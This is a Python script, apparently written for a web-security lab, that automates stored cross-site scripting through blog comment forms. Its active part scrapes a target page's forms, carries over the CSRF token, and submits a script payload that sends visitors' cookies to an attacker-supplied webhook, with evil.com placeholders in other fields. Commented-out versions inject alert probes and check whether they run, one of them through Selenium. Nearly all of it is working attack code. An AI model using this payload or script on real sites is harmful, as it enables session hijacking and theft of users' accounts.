import requests
from bs4 import BeautifulSoup
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = input("enter your target post URL: ").strip()
webhook = input("enter your webhook URL: ").strip()

# Payload XSS
payload = f'<script>new Image().src="{webhook}?c="+document.cookie;</script>'

session = requests.Session()
res = session.get(url, verify=False)
soup = BeautifulSoup(res.text, "html.parser")

forms = soup.find_all("form")
print(f"[+] Found {len(forms)} form(s)")

for i, form in enumerate(forms):
    print(f"\nForm #{i+1}")
    print(" Action:", form.get("action"))
    print(" Method:", form.get("method"))
    for input_tag in form.find_all(["input", "textarea"]):
        print(f"  {input_tag.name}: type={input_tag.get('type','text')}, name={input_tag.get('name')}")

choice = int(input(f"\nChoose form to submit (1-{len(forms)}): ")) - 1
form = forms[choice]

action = form.get("action")
method = form.get("method", "get").lower()
submit_url = action if action.startswith("http") else urljoin(url, action)

# Prepare payload data
data = {}
for input_tag in form.find_all(["input", "textarea"]):
    name = input_tag.get("name")
    if not name:
        continue
    if name == "email":
        data[name] = "attacker@evil.com"
    elif name == "postId":
        data[name] = url.split("postId=")[-1]
    elif name == "csrf":
        data[name] = input_tag.get("value", "")
        print("[*] CSRF token:", data[name])
    elif input_tag.name == "textarea":
        data[name] = payload
    elif name == "website":
        data[name] = "https://evil.com"
    else:
        data[name] = "attacker"

print(f"\n[+] Sending payload to {submit_url} ...")
res = session.post(submit_url, data=data, verify=False)
print("[+] Status code:", res.status_code)

if res.status_code == 200:
    print("[✓] Payload sent successfully. Check webhook!")
elif res.status_code == 400:
    print("[-] Bad request (400). Check for missing or invalid form fields.")
else:
    print("[-] Something else went wrong.")



print(f"[+] sending paylaod {submit_url}")
res = session.post(submit_url, data=data, verify=False)
print(f"[+] status: {res.status_code}")


# # FORM CHOOSER

# import requests
# from bs4 import BeautifulSoup
# from urllib.parse import urlparse, parse_qs, urljoin

# # دریافت URL
# full_url = input("Enter full URL (e.g. https://example.com/post?postId=3): ").strip()

# # تجزیه آدرس
# parsed = urlparse(full_url)
# base_url = f"{parsed.scheme}://{parsed.netloc}"
# path = parsed.path + ("?" + parsed.query if parsed.query else "")
# submit_url = base_url + path
# query_params = parse_qs(parsed.query)
# post_id = query_params.get("postId", [None])[0]

# # شروع session
# session = requests.Session()
# res = session.get(submit_url, verify=False)
# soup = BeautifulSoup(res.text, "html.parser")

# # گرفتن فرم‌ها
# forms = soup.find_all("form")
# if not forms:
#     print("[-] No forms found.")
#     exit()

# print(f"[+] Found {len(forms)} form(s).")
# for i, form in enumerate(forms):
#     print(f"\nForm #{i + 1}")
#     print("Action:", form.get("action"))
#     print("Method:", form.get("method"))
#     inputs = form.find_all(["input", "textarea", "select"])
#     for inp in inputs:
#         print(f" - {inp.name}: type={inp.get('type', 'text')}, name={inp.get('name')}")

# # انتخاب فرم
# choice = int(input(f"\nChoose form to submit (1-{len(forms)}): ")) - 1
# form = forms[choice]

# # ساختن submit URL واقعی
# action = form.get("action")
# method = form.get("method", "get").lower()
# real_action = urljoin(submit_url, action)

# # آماده کردن داده‌ها
# data = {}
# for inp in form.find_all(["input", "textarea", "select"]):
#     name = inp.get("name")
#     if not name:
#         continue
#     value = inp.get("value", "")
#     if "csrf" in name.lower():
#         data[name] = value
#     elif "postid" in name.lower():
#         data[name] = post_id or value
#     elif "comment" in name.lower():
#         data[name] = '<script>alert("XSS99")</script>'
#     elif "name" in name.lower():
#         data[name] = "sudo"
#     elif "email" in name.lower():
#         data[name] = "sudo@xmail.com"
#     elif "website" in name.lower():
#         data[name] = "http://nothing"
#     else:
#         data[name] = value

# # ارسال فرم
# print(f"\n[+] Sending payload to {real_action}...")
# if method == "post":
#     r = session.post(real_action, data=data, verify=False)
# else:
#     r = session.get(real_action, params=data, verify=False)

# print(f"[+] Status code: {r.status_code}")

# # بررسی وجود پیلود در صفحه
# check_res = session.get(submit_url, verify=False)
# if '<script>alert("XSS99")</script>' in check_res.text:
#     print("[+] XSS successful! Payload is reflected.")
# else:
#     print("[-] Payload not found in response.")





# NORMAL FORM

# import requests
# from bs4 import BeautifulSoup
# from urllib.parse import urlparse, parse_qs

# full_url = input("enter ur url: ").strip()
# parsed = urlparse(full_url)
# url = f"{parsed.scheme}://{parsed.netloc}"
# sub_path = parsed.path
# if parsed.query:
#     sub_path += "?" + parsed.query
# query_params = parse_qs(parsed.query)
# post_id = query_params.get("postId", [None])[0]

# payload = '<script>alert("XSS99")</script>'
# session = requests.Session()

# # گرفتن CSRF از فرم
# res = session.get(url + sub_path, verify=False)
# soup = BeautifulSoup(res.text, "html.parser")
# csrf_tag = soup.find("input", {"name": "csrf"})
# csrf = csrf_tag.get("value", "") if csrf_tag else ""

# # ارسال کامنت
# data = {
#     "csrf": csrf,
#     "postId": post_id,
#     "name": "sudo",
#     "email": "sudo@xmail.com",
#     "website": "https://nothing.com",
#     "comment": payload
# }

# submit_url = url + "/post/comment"
# r = session.post(submit_url, data=data, verify=False)
# print("[+] payload sent")

# # رفتن به صفحه اصلی پست برای بررسی وجود payload
# res_check = session.get(full_url, verify=False)
# if payload in res_check.text:
#     print("[+] XSS detected!")
# else:
#     print("[-] payload not found")












# SELENIUM



# from selenium import webdriver
# from selenium.webdriver.firefox.options import Options
# from selenium.webdriver.common.by import By
# from selenium.common.exceptions import UnexpectedAlertPresentException
# from bs4 import BeautifulSoup
# import time

# # ========== تنظیمات ==========
# options = Options()
# # اگه می‌خوای مرورگر باز شه خط پایین رو کامنت کن
# options.headless = False
# driver = webdriver.Firefox(options=options)

# # ========== ورود آدرس ==========
# url = input("Enter full page URL: ").strip()
# driver.get(url)
# time.sleep(2)

# # ========== استخراج فرم‌ها ==========
# soup = BeautifulSoup(driver.page_source, "html.parser")
# forms = soup.find_all("form")
# if not forms:
#     print("[-] No forms found.")
#     driver.quit()
#     exit()

# print(f"\n[+] Found {len(forms)} forms.")
# for i, form in enumerate(forms):
#     print(f"\nForm #{i+1}")
#     print("  Action:", form.get("action"))
#     print("  Method:", form.get("method", "GET").upper())
#     inputs = form.find_all(["input", "textarea", "select"])
#     for input_tag in inputs:
#         input_name = input_tag.get("name")
#         if not input_name:
#             continue
#         input_type = input_tag.get("type", "text") if input_tag.name == "input" else input_tag.name
#         print(f"    - {input_tag.name}: type = {input_type}, name = {input_name}")
#     print("-" * 40)

# # ========== انتخاب فرم ==========
# try:
#     choice = int(input(f"\n[?] Enter form number to use (1–{len(forms)}): "))
#     if choice < 1 or choice > len(forms):
#         print("[-] Invalid form number.")
#         driver.quit()
#         exit()
# except ValueError:
#     print("[-] Invalid input.")
#     driver.quit()
#     exit()

# selected_form = forms[choice - 1]
# input_names = [tag.get("name") for tag in selected_form.find_all(["input", "textarea", "select"]) if tag.get("name")]

# # ========== پر کردن فیلدها در صفحه ==========
# for name in input_names:
#     try:
#         element = driver.find_element(By.NAME, name)
#         if element.get_attribute("type") in ["hidden", "submit"]:
#             continue  # مقدار خودش ست شده
#         user_input = input(f"[+] Enter value for '{name}': ")
#         element.clear()
#         element.send_keys(user_input)
#     except:
#         print(f"[-] Could not fill: {name}")

# # ========== ارسال فرم ==========
# try:
#     driver.find_element(By.TAG_NAME, "form").submit()
# except:
#     print("[-] Submit failed.")
#     driver.quit()
#     exit()

# time.sleep(2)

# # ========== کلیک روی Back to blog (اختیاری) ==========
# try:
#     back_button = driver.find_element(By.LINK_TEXT, "Back to blog")
#     back_button.click()
#     time.sleep(2)
# except:
#     print("[*] No 'Back to blog' button found.")

# # ========== بررسی اجرای XSS ==========
# try:
#     alert = driver.switch_to.alert
#     print(f"[!!!] ALERT EXECUTED: {alert.text} ✅ (XSS Confirmed)")
#     alert.dismiss()
# except:
#     print("[*] No alert detected.")

# # ========== پایان ==========
# # اگه نمی‌خوای مرورگر بسته شه، این خط رو کامنت کن
# # driver.quit()
